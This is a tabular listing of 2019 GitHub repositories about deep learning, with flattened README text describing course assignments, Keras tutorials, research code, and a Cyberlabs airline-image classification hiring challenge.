RohitGupta06,Deep-Learning,n/a,Deep Learning Highly Resourceful Repository where you can get Highly Accurate Trained Models for various datasets such as Handwritten Digit Recognition Hello World of Deep Learning Iris Dataset Wine Dataset etc Concepts like Neural Networks Principle Component Analysis etc are coded from Scratch which can help you furnish your concepts,2019-08-18T17:28:25Z,2019-08-18T18:38:51Z,Jupyter Notebook,RohitGupta06,User,1,1,0,7,master,RohitGupta06,1,0,0,0,0,0,0
funson,Deep-learning,n/a,Deep learning Deep learning projects,2019-08-21T12:23:57Z,2019-08-21T14:46:18Z,n/a,funson,User,1,1,0,1,master,funson,1,0,0,0,0,0,0
himanshukj17122000,Deep-Learning-,n/a,,2019-08-07T09:05:46Z,2019-11-23T23:09:52Z,Python,himanshukj17122000,User,1,1,0,0,master,,0,0,0,0,0,0,0
sunjoshi1991,DEEP_LEARNING,n/a,DEEPLEARNING HUMANACTIVITYRECOGNITIONUSINGUCIDATA DATA https archive ics uci edu ml datasets human activity recognition using smartphones,2019-09-19T04:38:53Z,2019-09-19T04:42:02Z,Jupyter Notebook,sunjoshi1991,User,1,1,0,3,master,sunjoshi1991,1,0,0,0,0,0,0
SoumenDas0123,Deep_Learning,ann#cnn#deeplearning#keras#rnn,Deep Learning with Keras Here we will try to explain the basic understanding of Deep Learning technique like ANN CNN RNN LSTM etc implementing in Kears which is an easy and go to Deep Learning framework 1 ANN 2 CNN Image classifier 3 RNN Stock Price Prediction,2019-09-12T00:14:04Z,2019-11-13T13:36:08Z,Jupyter Notebook,SoumenDas0123,User,1,1,0,6,master,SoumenDas0123,1,0,0,0,0,0,0
Badruddoza,deep-learning,n/a,,2019-08-18T20:35:52Z,2019-08-18T20:46:12Z,R,Badruddoza,User,1,1,0,1,master,Badruddoza,1,0,0,0,0,0,0
heenasingh1995,Deep-learning,n/a,,2019-08-19T19:27:23Z,2019-10-02T15:34:34Z,Jupyter Notebook,heenasingh1995,User,1,1,0,8,master,heenasingh1995,1,0,0,0,0,0,0
ahmedhisham73,deep_learningtuts,n/a,deeplearningtuts,2019-08-25T12:05:50Z,2019-12-03T10:17:38Z,Jupyter Notebook,ahmedhisham73,User,1,1,0,24,master,ahmedhisham73,1,0,0,0,0,0,0
Bowenduan,Deep_Learning,cnn#pytorch#rnn#tensorflow,Deep Learning in Practice Code Structure Deeplearning Cnn cnn models in pytorch trained on cifar dataset Estimator learning tf Estimator Sequence sequence models such as rnn lstm in tensorflow 2048 2048 implemented in python just for fun,2019-08-14T06:12:56Z,2019-12-12T14:32:52Z,Python,Bowenduan,User,1,1,0,3,master,Bowenduan,1,0,0,0,0,0,0
yanghexing,Deep-Learning,n/a,,2019-09-05T09:54:56Z,2019-09-13T15:41:35Z,Python,yanghexing,User,1,1,0,3,master,yanghexing,1,0,0,0,0,0,0
sbaskey,Deep-Learning,n/a,Deep Learning Deep Learning PME 7th sem implementaion are in python assignment1 Percetron algorithm implementation,2019-08-14T17:08:13Z,2019-10-07T16:43:34Z,Jupyter Notebook,sbaskey,User,1,1,0,6,master,sbaskey,1,0,0,0,0,0,0
senseas,deep-learning,n/a,deep learning AI ML,2019-08-09T02:02:49Z,2019-11-09T06:20:39Z,Java,senseas,Organization,1,1,0,12,master,vewjs,1,0,0,0,0,0,0
nnewman1,Deep_Learning,artificial-intelligence#artificial-intelligence-algorithms#artificial-neural-networks#deep-learning#deep-learning-algorithms#python3#scikit-learn,DeepLearning A repository dedicated to deep learning algorithms such as Deep Neural Networks Convolutional Neural Networks Auto Encoders Stacked Auto Encoders Recurrent Neural Networks Long Short Term Networks Deep Belief Networks Deep Boltzmann Machines and Generative Adversarial Networks The deep learning algorithm libraries will be written in Sklearn Tensorflow Keras Pytorch Theano Numpy and More These files will be written in Python 3 7 and C,2019-08-07T17:25:08Z,2019-12-05T19:04:29Z,Python,nnewman1,User,0,1,0,25,master,nnewman1,1,0,0,0,0,0,0
adetoroe787,Deep-Learning,n/a,,2019-09-10T10:23:53Z,2019-09-10T10:50:09Z,Python,adetoroe787,User,1,1,0,1,master,adetoroe787,1,0,0,0,0,0,0
shubhamsks,deep-learning,n/a,Deep learning This repository contains the deep learning model that I had built and building in python You can run these model on Colaba research google com without caring about any libraries or You can run these model on your machine by installing 1 tensorflow 2 keras backend tensorflow 3 pytorch 4 Numpy,2019-08-16T07:17:25Z,2019-09-01T18:07:16Z,Jupyter Notebook,shubhamsks,User,1,1,0,9,master,shubhamsks,1,0,0,0,0,0,0
tfaria,deep-learning,n/a,,2019-09-06T02:03:33Z,2019-09-06T02:12:27Z,Jupyter Notebook,tfaria,User,0,1,0,2,master,tfaria,1,0,0,0,0,0,0
Yogeshnaik1190,Deep-Learning,n/a,Deep Learning All the deep learning codes and data Optical Character Recognition Using Google Vision API in Python Please refer following files 1 Input images English sample 2 hindi sample 3 ML model development and deployment 2 Code file GooglevisionOCR ipynb For more details please refer the explaination https limitlessdatascience wordpress com 2019 09 19 vision api detect handwriting ocr python code implementation Using Tesseract in Python Please refer following files 1 English sample 2 NoisyImage png hindi sample with different fonts png 2 Examplesusingtesseract3OCR ipynb 3 Examplesusingtesseract4OCR ipynb 4 techniquestoImproveAccuracyofthetesseract2 ipynb 5 For tilted image containing a text to be read we can correct the angle and then read the text using tessract for more accuracy for this please refer this code file EndtoendAutoImagetiltangledetectionandcorrection ipynb and input file DemoImage png 6 For automatic cropping of white border refer this link https github com Yogeshnaik1190 Pre processing For more details please refer the explaination 1 https limitlessdatascience wordpress com 2019 07 31 tesseract 3 0 and 4 0 implementation and output comparison 2 https limitlessdatascience wordpress com 2019 08 22 automatic image tilt detection using canny edge and hough lines and correction Sentiment Analysis using Google Language API Please refer following files 1 SentimentanalysisusinggooglelanguageAPI ipynb 2 GoogleSentimentScoreCategories png Medical images analysis 1 Segmentation using U Net model refer file UNetBimedicalimagesegmentation ipynb Data zip U Net Architecture png,2019-08-19T07:04:32Z,2019-10-15T04:26:55Z,Jupyter Notebook,Yogeshnaik1190,User,1,1,0,33,master,Yogeshnaik1190,1,0,0,0,0,0,0
chlgpdus921,Deep-Learning-Lecture,n/a,Deep Learning Lecture Machine Learning Deep Learning Lectures,2019-08-12T14:17:59Z,2019-09-29T08:05:37Z,n/a,chlgpdus921,User,1,1,0,20,master,chlgpdus921,1,0,0,0,0,0,0
yingliC,deep_learning_from_scratch,n/a,deeplearningfromscratch learning,2019-08-30T07:50:05Z,2019-09-03T12:17:30Z,Python,yingliC,User,1,1,0,1,master,yingliC,1,0,0,0,0,0,0
Niranjankumar-c,DeepLearning_A-Z_NeuralNetworks_Python,autoencoder#boltzmann-machines#convolutional-neural-networks#deep-learning-tutorial#deep-neural-networks#keras-neural-networks#pytorch-tutorial,Deep Learning A Z Hands On Artificial Neural Networks Learn to create Deep Learning Algorithms in Python from two Machine Learning Data Science experts In this repository I have uploaded all the projects that I have done as a part of Udemy Course Deep Learning A Z Hands On Artificial Neural Networks Course link https www udemy com deeplearning The following topics are covered in this course Understand the intuition behind Artificial Neural Networks Apply Artificial Neural Networks in practice Understand the intuition behind Convolutional Neural Networks Apply Convolutional Neural Networks in practice Understand the intuition behind Recurrent Neural Networks Apply Recurrent Neural Networks in practice Understand the intuition behind Self Organizing Maps Apply Self Organizing Maps in practice Understand the intuition behind Boltzmann Machines Apply Boltzmann Machines in practice Understand the intuition behind AutoEncoders Apply AutoEncoders in practice,2019-08-31T17:09:38Z,2019-11-09T13:46:40Z,Jupyter Notebook,Niranjankumar-c,User,2,1,1,2,master,Niranjankumar-c,1,0,0,0,0,0,0
TrainingByPackt,Applied-Deep-Learning-with-Keras-eLearning,auc-roc-score#cnn#convolutional-neural-network#cross-validation#deep-learning#feature-detection#feature-map#flattening#keras#keras-wrapper#max-pooling#null-accuracy#precision#python#recurrent-neural-networks#rnn#scikit-learn#sensitivity#sequential-modelling#specificity,GitHub issues https img shields io github issues TrainingByPackt Applied Deep Learning with Keras eLearning svg https github com TrainingByPackt Applied Deep Learning with Keras eLearning issues GitHub forks https img shields io github forks TrainingByPackt Applied Deep Learning with Keras eLearning svg https github com TrainingByPackt Applied Deep Learning with Keras eLearning network GitHub stars https img shields io github stars TrainingByPackt Applied Deep Learning with Keras eLearning svg https github com TrainingByPackt Applied Deep Learning with Keras eLearning stargazers PRs Welcome https img shields io badge PRs welcome brightgreen svg https github com TrainingByPackt Applied Deep Learning with Keras eLearning pulls Applied Deep Learning with Keras Applied Deep Learning with Keras takes you from a basic knowledge of machine learning and Python to an expert understanding of applying Keras to develop efficient deep learning solutions This course teaches you new techniques to handle neural networks and in turn broadens your options as a data scientist What you will learn Understand the difference between single layer and multi layer neural network models Use Keras to build simple logistic regression models deep neural networks recurrent neural networks and convolutional neural networks Apply L1 L2 and dropout regularization to improve the accuracy of your model Implement cross validate using Keras wrappers with scikit learn Understand the limitations of model accuracy Hardware requirements For an optimal experience we recommend the following hardware configuration Processor Intel Core i5 or equivalent Memory 4 GB RAM 8 GB Preferred Storage 35 GB available space Software requirements You ll also need the following software installed in advance OS Windows 7 SP1 64 bit Windows 8 1 64 bit or Windows 10 64 bit Ubuntu Linux or the latest version of OS X Browser Google Chrome Mozilla Firefox Latest Version Notepad Sublime Text as IDE Optional as you can practice everything using Jupyter notecourse on your browser Python 3 4 latest is Python 3 7 installed from https python org Python libraries as needed Jupyter Numpy Pandas Matplotlib BeautifulSoup4 and so on,2019-08-27T10:00:50Z,2019-11-23T16:22:45Z,Jupyter Notebook,TrainingByPackt,Organization,2,1,1,14,master,nathaline,1,0,0,0,0,0,0
m-and-ms,Deep-Learning-Course-Submissions-,n/a,Deep Learning Course Submissions This repository includes labs and submission files for deep learning and neural networks course at zewail city CIE 555,2019-09-02T20:58:40Z,2019-09-03T05:25:37Z,Jupyter Notebook,m-and-ms,User,1,1,0,3,master,m-and-ms,1,0,0,0,0,0,0
sugaok,my-deep-learning,n/a,my deep learning python main py h python main py m original d fashionmnist bs 200 e 1000 mkw numrnnlayers 4 ckw quality 0 skipheader True augment il 105,2019-08-23T09:54:10Z,2019-12-03T06:46:37Z,Python,sugaok,User,1,1,0,31,master,sugaok,1,0,0,0,0,0,0
atulvidyarthi29,Machine-Learning-and-Deep-Learning-Models,n/a,,2019-09-14T16:59:09Z,2019-09-14T17:08:40Z,Python,atulvidyarthi29,User,0,1,0,1,master,atulvidyarthi29,1,0,0,0,0,0,0
somTian,deep_learning_model,n/a,deeplearningmodel,2019-09-05T02:15:32Z,2019-09-12T05:37:16Z,Python,somTian,User,1,1,0,0,master,,0,0,0,0,0,0,0
vgp314,advanced-machine-learning-deeplearning,n/a,Advanced Machine Learning Introdution to Deep Learning Week 1 1 Programming assignment Linear models Optimization In this programming assignment you will implement a linear classifier and train it using stochastic gradient descent modifications and numpy 2 Goals of the week Train a linear model for classification or regression task using stochastic gradient descent Tune SGD optimization using different techniques Apply regularization to train better models Use linear models for classification and regression tasks Week 2 1 MNIST digits classification with TensorFlow 2 Goals of the week Explain the mechanics of basic building blocks for neural networks Apply backpropagation algorithm to train deep neural networks using automatic differentiation Implement train and test neural networks using TensorFlow and Keras Week 3 1 In this task you will build your first Convolutional Neural Network More specifically you will do the following 1 1 Define your first CNN architecture for CIFAR 10 dataset which contains 32x32 colour images from 10 classes airplane automobile bird cat deer dog frog horse ship truck 1 2 Train it from scratch observing the decrease of the loss for several hours 1 3 Visualise learnt filters 2 In this task you will fine tune InceptionV3 architecture for flowers classification task InceptionV3 architecture https research googleblog com 2016 03 train your own image classifier with html Flowers classification dataset http www robots ox ac uk vgg data flowers 102 index html consists of 102 flower categories commonly occurring in the United Kingdom Each class contains between 40 and 258 images 3 Goals of the week Define and train a CNN from scratch Understand building blocks and training tricks of modern CNNs Use pre trained CNN to solve a new task Week 4 1 In this task you will train your own autoencoder for human faces 2 Goals of the week Understand what is unsupervised learning and how you can benifit from it Implement and train deep autoencoders Apply autoencoders for image retrieval and image morphing Implement and train generative adversarial networks Understand basics of unsupervised learning of word embeddings Week 5 1 Generating names with recurrent neural networks 2 Goals of the week Define and train an RNN from scratch Understand modern architectures of RNNs LSTM GRU Use RNNs for different types of tasks sequential input sequential output sequential input and output Week 6 1 In this final project you will define and train an image to caption model that can produce descriptions for real world images Model architecture CNN encoder and RNN decoder https research googleblog com 2014 11 a picture is worth thousand coherent html 2 Goals of the week Apply your skills to train an Image Captioning model,2019-08-14T17:21:26Z,2019-08-14T20:30:12Z,n/a,vgp314,User,1,1,0,4,master,vgp314,1,0,0,0,0,0,0
zhenzey,deep_learning_coursera,n/a,Deep Learning Specialization Projects from the Deep Learning Specialization https www coursera org specializations deep learning from deeplearning ai https www deeplearning ai offered by Coursera Instructor Andrew Ng http www andrewng org Master Deep Learning and Break Into AI If you want to break into AI this Specialization will help you do so Deep Learning is one of the most highly sought after skills in tech We will help you become good at Deep Learning In five courses you will learn the foundations of Deep Learning understand how to build neural networks and learn how to lead successful machine learning projects You will learn about Convolutional networks RNNs LSTM Adam Dropout BatchNorm Xavier He initialization and more You will work on case studies from healthcare autonomous driving sign language reading music generation and natural language processing You will master not only the theory but also see how it is applied in industry You will practice all these ideas in Python and in TensorFlow which we will teach You will also hear from many top leaders in Deep Learning who will share with you their personal stories and give you career advice AI is transforming multiple industries After finishing this specialization you will likely find creative ways to apply it to your work Programming Assignements Course 1 Neural Networks and Deep Learning Week 2 PA 1 Logistic Regresssion as a Neural Network Week 2 PA 2 Python Basics with Numpy Week 3 PA 1 Planar data classification with one hidden layer Week 4 PA 1 Building your Deep Neural Network Step by Step Week 4 PA 2 Deep Neural Network ApplicationImage Classification Course 2 Improving Neural Networks Week 1 PA 1 Gradient Checcking Week 1 PA 2 Regularisation Week 1 PA 3 Initialization Week 2 PA 1 Optimization Methods Week 3 PA 1 Tensorflow Tutorial Course 4 Convolutional Neural Networks Week 1 PA 1 Convolutional Model Week 2 PA 1 Keras Tutorial Week 2 PA 2 ResNets Week 3 PA 1 Car Detection for Autonomous Driving Week 4 PA 1 Face Recognition Week 4 PA 2 Neural Style Transfer Course 5 Sequence Models Week 1 PA 1 Building a RNN step by step Week 1 PA 2 Dinosaur Island Week 1 PA 3 Jazz Imrpovisation with LSTM Week 2 PA 1 Emojify Week 2 PA 2 Word Vector Representation Week 3 PA 1 Machine Translation Week 3 PA 2 Trigger Word Detection Prerequisites The Code is written in Python 3 6 5 If you don t have Python installed you can find it here https www python org downloads If you are using a lower version of Python you can upgrade using the pip package ensuring you have the latest version of pip To install pip run in the command Line python m ensurepip default pip to upgrade it python m pip install upgrade pip setuptools wheel to upgrade Python pip install python upgrade You will also need to install additional packages depending the Course you are following and the relevant assignement Seperate ReadMes will guide you for each individual course Viewing the Jupyter Notebook In order to better view and work on the jupyter Notebook I encourage you to use nbviewer https nbviewer jupyter org You can simply copy and paste the link to this website and you will be able to edit it without any problem Alternatively you can clone the repository using git clone https github com fotisk07 Deep Learning then in the command Line type after you have downloaded jupyter notebook type jyputer notebook locate the notebook and run it Disclaimer Please use this repository ONLY as reference or for help and do not hard copy and paste the assignements Contributing Please read CONTRIBUTING md https github com fotisk07 Depe Learning master CONTRIBUTING for the process for submitting pull requests Authors Fotios Kapotos Initial work This project is licensed under the MIT License see the LICENSE md https github com fotisk07 Deep Learning blob master LICENSE file for details,2019-08-16T02:49:46Z,2019-11-06T23:56:16Z,Jupyter Notebook,zhenzey,User,1,1,0,16,master,zhenzey,1,0,0,0,0,0,0
Aayaam-AI,Deep-Learning-Specialization,n/a,,2019-09-13T20:03:12Z,2019-10-30T05:21:06Z,Jupyter Notebook,Aayaam-AI,User,1,1,0,0,master,,0,0,0,0,0,0,0
rfbr,PDR_with_Deep_Learning,n/a,Deep learning based pedestrian dead reckoning using smartphone IMU This project was part of my research internship at Kyushu University in Japan supervised by professor Hideaki Uchiyama It is based on above works https github com jpsml 6 DOF Inertial Odometry https www mdpi com 1424 8220 19 17 3777 pdf Introduction Selfsufficient running and independance from the outside environment give smarthpone built in inertial sensors an important role in indoor navigation This repository allows the creation of a mobile real time indoor positioning system using a smart phone held in hand In order to achieve this we will only use the Inertial Measurement Unit IMU present in the phone gathering acceleration and angular velocity The proposed method is based on 6 DOF odometry computing relative sensor pose changes between two sequential moments using a neural network The estimate will then be refined by a Bayesian filter a particle filter associated with a map matching algorithm This repository contains only the 6 DOF odometry implementation using IMU data gathered with an android application powered by a CNN LSTM neural network It allows to create a tflite model with the best trained model ready to be used in our android application Global trajectory estimation To estimate the pedestrian 3D world coordinates we use our neural network to predict 6DOF relative coordinates represented by a translation vector and a quaternion rotation vector between two given timestamps separated by a constant step Thus by combining all relative poses we can compute the global pose Data format We use IMU data acceleration and angular velocity gathered by an android application via embedded accelerometer and gyroscope to estimate the ground truth position captured via ARCore The neural network We tryed different architectures and kept the best one according to the validation loss tracked with TensorBoard lolz https user images githubusercontent com 45492759 69095785 5d2cc580 0a53 11ea 8c4d 15a0c374ebb5 png The architecture corresponding is the following NN 1 https user images githubusercontent com 45492759 69096096 0ecbf680 0a54 11ea 820e 9668266872a6 png Our neural network can be divided into three main parts A convolutional part accelerometer and gyroscope data are preprocessed separatly We use 3 layers to extract local features 1D convolutional layer max pooling 1D convolutional layer and then concatenate the results A LSTM part we use two LSTM layers to process preprocessed IMU data as a time series A multi loss layer this part is used to optimize the different weights between the different loss functions in use according to the multi task learning theory 1 https arxiv org abs 1705 07115 Project architecture Data folder it contains tensorboard logs saved models by Keras callback and training and testind data Utils folder it contains data processing geometry models and plotting functions Estimation files there are the main files used to load the data preprocess them train the neural network predict the relative poses and plot the global estimated trajectory Prerequisite Nvidia driver 410 104 CUDA version 10 0 Python 3 7 Tensorflow gpu 1 14 0 Usage I recommend you use Anaconda distribution to create a virtual environment as follow console conda create n tfenv python 3 7 conda activate tfenv pip install tensorflow gpu pip install numpy quaternion pip install tfquaternion pip install tqdm conda install scikit learn conda install basemap conda install pandas conda install numba This project was designed to be user friendly just execute python m pdr and follow the different instructions Results You can find some results in the img folder Here are some examples With normal training data 1 https user images githubusercontent com 45492759 64983234 5ac9b600 d8c0 11e9 87c0 d53ada211f5f png 2 https user images githubusercontent com 45492759 64983238 5bfae300 d8c0 11e9 9af7 31400fd39063 png 4 https user images githubusercontent com 45492759 64983246 5f8e6a00 d8c0 11e9 92b1 91ffb40a1db4 png With augmented training data linear interpolation Figure1 https user images githubusercontent com 45492759 64983597 2dc9d300 d8c1 11e9 814e 1b0e227e9efe png Figure2 https user images githubusercontent com 45492759 64983598 2e626980 d8c1 11e9 8436 0b445d134c62 png Figure4 https user images githubusercontent com 45492759 64983603 2f939680 d8c1 11e9 8088 138280f54684 png Concerning floor changing detection data augmentation leads to bad results Spherical linear interpolation for quaternions might not be the best or we may have done some mistakes With normal training data 6 https user images githubusercontent com 45492759 64983633 3f12df80 d8c1 11e9 88ee 43b68b174306 png 7 https user images githubusercontent com 45492759 64983637 3fab7600 d8c1 11e9 9296 0be589ef1a5d png With augmented training data linear interpolation Figure6 https user images githubusercontent com 45492759 64983644 41753980 d8c1 11e9 96ff b014a8895275 png Figure7 https user images githubusercontent com 45492759 64983797 a6c92a80 d8c1 11e9 9411 5535b6f9ef9b png,2019-09-14T15:49:43Z,2019-12-06T08:43:20Z,Python,rfbr,User,1,1,0,6,master,rfbr,1,0,0,0,0,0,0
cansik,deep-learning-processing,n/a,Deep Learning Processing A simple example on how to use deep learning DL4J together with processing Example Result Result data result jpg detection took 2403 ms Credits Inspired by holger prause https github com holger prause dl4jyolo Photo by Xiang Ji on Unsplash,2019-08-16T14:56:14Z,2019-08-16T15:12:46Z,Java,cansik,User,1,1,0,2,master,cansik,1,0,0,0,0,0,0
RDSJC,deep-learning-notes,n/a,deep learning notes cheatsheets emsp emsp python machine learning python emsp emsp stanford cs 229 machine learning CS229 samples emsp emsp basic emsp emsp dogs vs cats CNN emsp emsp jenaclimate LSTM,2019-09-05T07:44:24Z,2019-09-05T08:04:01Z,n/a,RDSJC,User,1,1,0,7,master,RDSJC,1,0,0,0,0,0,0
akki3d76,Deep-Learning-Using-Keras,n/a,Deep Learning Using Keras Implementation of various Deep Learning models using Keras,2019-08-24T02:54:55Z,2019-09-29T21:17:53Z,Jupyter Notebook,akki3d76,User,1,1,0,3,master,akki3d76,1,0,0,0,0,0,0
S3688570,Cars_Deep_Learning,n/a,CarsDeepLearning Deep learning model to identify vehicle accidents,2019-09-15T14:45:42Z,2019-10-24T12:06:55Z,Jupyter Notebook,S3688570,User,1,1,0,18,master,S3688570,1,0,0,0,0,0,0
aidiary,deep-learning-notebooks,n/a,deep learning notebooks,2019-08-16T01:01:14Z,2019-10-08T02:26:20Z,Jupyter Notebook,aidiary,User,2,1,0,23,master,aidiary,1,0,0,0,0,0,0
xslittlemaggie,Deep-Learning-Projects,n/a,Machine Learning Projects,2019-09-07T22:02:52Z,2019-12-03T14:55:01Z,Jupyter Notebook,xslittlemaggie,User,1,1,0,49,master,xslittlemaggie,1,0,0,0,0,0,0
sidjin01,Deep-Learning-Models,n/a,This repository contains numpy based python implementations of the following Deep Learning models CNN RNN LSTM NN,2019-09-09T16:54:19Z,2019-10-01T07:59:21Z,Python,sidjin01,User,1,1,1,4,master,sidjin01,1,0,0,0,0,0,0
LK2018,2019-deep-learning-camp,n/a,,2019-09-16T13:27:09Z,2019-09-26T13:30:11Z,Python,LK2018,User,4,1,1,9,master,LK2018#EVOMA,2,0,0,0,0,0,0
herbertcordeiro,keras-deep-learning,n/a,keras deep learning,2019-08-12T01:23:00Z,2019-08-22T14:09:38Z,Jupyter Notebook,herbertcordeiro,User,1,1,0,2,master,herbertcordeiro,1,0,0,0,0,0,0
Abby263,Deep_Learning_Bootcamp,n/a,DeepLearningBootcamp This repository contains an intensive program intended to teach you all about deep learning The Bootcamp is a hands on and immersive course to learn Machine Learning amp Deep Learning fast with Python,2019-08-12T08:00:16Z,2019-09-17T12:52:05Z,Python,Abby263,User,1,1,0,4,master,Abby263,1,0,0,0,0,0,0
michaelwty,deep-learning-specialization,n/a,,2019-08-16T00:42:43Z,2019-09-29T04:37:33Z,Jupyter Notebook,michaelwty,User,1,1,0,25,master,michaelwty,1,0,0,0,0,0,0
NanaYawMacarthy,deep-learning-worls,n/a,,2019-08-29T08:50:38Z,2019-08-30T22:32:35Z,n/a,NanaYawMacarthy,User,1,1,0,0,master,,0,0,0,0,0,0,0
JellyLovesCoding,deep-learning-aerodynamics-magnetic,n/a,,2019-09-09T14:31:48Z,2019-09-27T00:20:45Z,n/a,JellyLovesCoding,User,1,1,0,0,master,,0,0,0,0,0,0,0
MustaphaAbdulkadir1983,distributed_deep_learning,n/a,,2019-08-28T12:32:23Z,2019-10-08T02:29:15Z,Python,MustaphaAbdulkadir1983,User,1,1,0,3,master,MustaphaAbdulkadir1983,1,0,0,0,0,0,0
zzhang1987,Deep-Graphical-Feature-Learning,n/a,Deep Graphical Feature Learning for the Feature Matching Problem ICCV2019 Created by Zhen Zhang https zzhang org and Wee Sun Lee https www comp nus edu sg leews Citation If you find the code useful please consider citing inproceedingsZhang2019ICCV Author Zhen Zhang and Wee Sun Lee Title Deep Graphical Feature Learning for the Feature Matching Problem Year 2019 booktitle Proceedings of the IEEE International Conference on Computer Vision Dependencies Please install the following dependencies for training and testing shell conda create n python3 6 python 3 6 conda activate python3 6 conda install tensorflow conda install conda install pytorch torchvision cudatoolkit 10 0 c pytorch adjust the cuda version according to your platform conda install scikit image pip install tqdm Train the model The following code can be used to train the model shell python train py batchsize 64 on RTX2080Ti uses about 9GB GPU memory Test the model After training over random generated 9M samples the training code will finally generate a parameter file matchingresTruegpTrueepoch8 pt As in our code the random matching pairs are generated on the fly it is equivalent to training over 9M samples for one epoch Synthetic data To reproduce the experimental results on synthetic data please run the following script shell python testsyn py parampath matchingresTruegpTrueepoch8 pt CMU House The original link to download the CMU house dataset is not valid anymore thus the data is included in the repo To reproduce the experimental results on the dataset please run the script as follows shell python testcmuhouse py parampath matchingresTruegpTrueepoch8 pt datapath datasets cmum house PF Pascal To reproduce the experimental results on PF Pascal dataset please first download the PF Pascal dataset by running the script as follows shell pushd datasets downloads sh popd After that the results can be reproduces by running the following script shell python testpascalpf py parampath matchingresTruegpTrueepoch7 pt datapath datasets PF dataset PASCAL randomrotate False python testpascalpf py parampath matchingresTruegpTrueepoch7 pt datapath datasets PF dataset PASCAL randomrotate True,2019-08-15T13:45:23Z,2019-11-21T07:08:00Z,Python,zzhang1987,User,2,1,0,42,master,zzhang1987,1,0,0,0,0,0,0
cyberlabsai,desafios-deep-learning,n/a,Cyberlabs Beat Human Performance Este desafio uma parte do processo de sele o da Cyberlabs Ele direcionado para uma pessoa desenvolvedora de software alocada na cidade do Rio de Janeiro que pretende se juntar ao nosso time que fica no escritrio de Botafogo pertinho do Metr Gostamos e damos preferncia para trocas de experincias no dia a dia mas temos total flexibilidade para eventuais home office e trabalhos a dist ncia Somos muito transparentes em tudo que fazemos por aqui e temos o objetivo master de manter um ambiente inclusivo e diversificado desta forma convidamos candidatas mulheres pessoas que se identificam como negras transexuais homoafetivas e que se enquadram em outras minorias para a realiza o deste desafio Literalmente nossas portas est o abertas para todos Nossa empresa Se voc curte inova o a Cyberlabs ir lhe proporcionar um ambiente gigante de aprendizado J somos 30 pessoas em constante evolu o e crescimento Temos integrantes no Rio Braslia e Floripa e projetos grandes de AI no Brasil todo pra voc participar Alm de nossos trs produtos principais KeyApp InSight Now e a plataforma Predisaurus temos em nossa carteira de clientes empresas como iFood Wilson Sons Aeroporto Rio Gale o SmartFit BlueFit Accenture BodyTech entre outras Conhea mais sobre nossos projetos e o que fazemos https cyberlabs ai Your mission is to build an image classification model that can differentiate between two different airlines of your choosing given an image of an aircraft for example differentiate between Azul and Gol using any of the following frameworks Tensorflow PyTorch or Keras For example given the input image alt text https github com cyberlabsai desafios deep learning blob master images klm png Your code should output the company name in this case KLM For collecting and cleaning your dataset we recommend you scrape from www airliners net which contains a big collection of airplane pictures already separated by airline model etc You may also use any technique you find necessary on achieving the highest possible accuracy without overfitting your model eg transfer learning Best of luck AI Dev Team at CyberLabs Como participar do desafio Antes de iniciar os passos necessrios para realizar o desafio tenha em mente que voc dever seguir todos os requisitos do mesmo Sejam eles relacionados a stacks metolodigas formas de entrega escrita de cdigo ou qualquer outro requisito descrito no contedo do desafio 1 D um fork neste repositrio 2 Clone o fork na sua mquina 3 Escreva seu programa utilizando estritamente todos os requisitos listados pelo desafio muito importante voc ter em mente qua avaliaremos seus commits no Git ent o n o esquea de realizar um commit a cada vitria conquistada 4 Seu repositrio dever conter um README md descrevendo os passos para treinar seu dataset e rodar seu programa descrevendo tambm como foi o seu processo de treinamento a arquitetura usada no modelo e quais tcnicas foram usadas para ampliar e processar a imagem Da mesma forma dever conter um script de demo do cdigo e as instrues necessrias para a execu o do mesmo O dataset usado para o treinamento do modelo poder ser enviado para qualquer servio de compartilhamento em nuvem como Google Drive Dropbox ou similares e o link para download dever ser relacionado no arquivo README md 5 Assim que testar tudo e validar que tudo funciona faa seu ltimo commit com o ttulo Finaliza o do desafio de rea da Cyberlabs 6 Abra uma issue neste repositrio com o ttulo DESAFIO Seu nome Sua cidade 7 No contedo da issue faa um breve resumo sobre voc uma mini bio bem simples mesmo falando algo que possa chamar nossa aten o pode ser um hobbie experincias profissionais passadas acontecimentos e curiosidades sobre o decorrer do desafio ou qualquer coisa extra que voc gostaria de compartilhar conosco Isso muito importante para que ns possamos aprender um pouco mais sobre voc 8 Na sequncia da sua bio coloque o link do seu fork aqui do github com o cdigo que voc gerou Aproveite tambm para nos enviar seu LinkedIn e se quiser seu e mail alm de outras formas de contato como suas redes sociais por exemplo Assim que sua issue for aberta algum membro da Cyberlabs https cyberlabs ai entrar em contato com voc diretamente e aps analisar seu desafio te dar um feedback transparente sobre ele e te encaminhar para os prximos passos se for o caso Lembre se quanto mais informaes tivermos sobre voc melhor conseguiremos te avaliar Mande seu desafio e boa sorte,2019-08-15T13:37:46Z,2019-09-05T03:43:26Z,n/a,cyberlabsai,Organization,3,1,1,6,master,lumelster#luiguild,2,0,0,1,0,0,0
lildocinny,deep_learning_face_detection,n/a,deeplearningfacedetection Face detection,2019-08-29T09:19:08Z,2019-08-29T10:06:43Z,Python,lildocinny,User,1,1,0,1,master,lildocinny,1,0,0,0,0,0,0
archit047,Deep-learning-implementation,n/a,Deep learning implementation it is a simple implementation od A I self driving car using python and its pakages AI for Self Driving Car Importing the libraries import numpy as np import random import os import torch import torch nn as nn import torch nn functional as F import torch optim as optim import torch autograd as autograd from torch autograd import Variable 1 Creating the architecture of the Neural Network class Network nn Module def init self inputsize nbaction super Network self init self inputsize inputsize self nbaction nbaction self fc1 nn Linear inputsize 30 self fc2 nn Linear 30 nbaction def forward self state x F relu self fc1 state qvalues self fc2 x return qvalues Implementing Experience Replay class ReplayMemory object def init self capacity self capacity capacity self memory def push self event self memory append event if len self memory self capacity del self memory 0 def sample self batchsize samples zip random sample self memory batchsize return map lambda x Variable torch cat x 0 samples Implementing Deep Q Learning class Dqn def init self inputsize nbaction gamma self gamma gamma self rewardwindow self model Network inputsize nbaction self memory ReplayMemory 100000 self optimizer optim Adam self model parameters lr 0 001 self laststate torch Tensor inputsize unsqueeze 0 self lastaction 0 self lastreward 0 def selectaction self state probs F softmax self model Variable state volatile True 100 T 100 action probs multinomial return action data 0 0 def learn self batchstate batchnextstate batchreward batchaction outputs self model batchstate gather 1 batchaction unsqueeze 1 squeeze 1 nextoutputs self model batchnextstate detach max 1 0 target self gamma nextoutputs batchreward tdloss F smoothl1loss outputs target self optimizer zerograd tdloss backward retainvariables True self optimizer step def update self reward newsignal newstate torch Tensor newsignal float unsqueeze 0 self memory push self laststate newstate torch LongTensor int self lastaction torch Tensor self lastreward action self selectaction newstate if len self memory memory 100 batchstate batchnextstate batchaction batchreward self memory sample 100 self learn batchstate 